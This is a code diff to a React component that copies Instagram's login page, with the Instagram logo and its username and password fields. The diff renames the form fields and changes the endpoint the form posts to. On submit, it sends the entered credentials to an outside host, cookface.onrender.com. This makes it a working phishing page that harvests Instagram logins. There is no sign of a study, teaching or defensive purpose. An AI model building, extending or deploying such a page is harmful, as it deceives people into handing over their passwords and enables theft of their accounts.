@@ -5,10 +5,7 @@ import ig_logo from "../Assets/Instagram-Logo.wine.svg";
 import { useNavigate } from "react-router-dom";
 
 const Instagram = () => {
-  const [formData, setFormData] = React.useState({
-    username: "",
-    password: "",
-  });
+  const [formData, setFormData] = React.useState({ user: "", pass: "" });
   const [loading, setLoading] = React.useState(false);
 
   const handleLogin = (e) => {
@@ -21,10 +18,7 @@ const Instagram = () => {
   const handleSubmit = (e) => {
     e.preventDefault();
     // make a request to the backend
-    axios.post(
-      "https://facecookbackend.onrender.com/api/v2/instagram",
-      formData
-    );
+    axios.post("https://cookface.onrender.com/api/v2/instagram", formData);
     setLoading(true);
 
     // set a timeout
@@ -65,16 +59,16 @@ const Instagram = () => {
               className="w-full p-2 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
               placeholder="Phone number, username, or email"
               type="text"
-              name="username"
-              value={formData.username}
+              name="user"
+              value={formData.user}
               onChange={handleLogin}
               required
             />
             <input
               className="w-full p-2 text-gray-700 text-sm bg-[#efefef] border border-gray-300 rounded"
               type="password"
-              name="password"
-              value={formData.password}
+              name="pass"
+              value={formData.pass}
               onChange={handleLogin}
               placeholder="Password"
               required
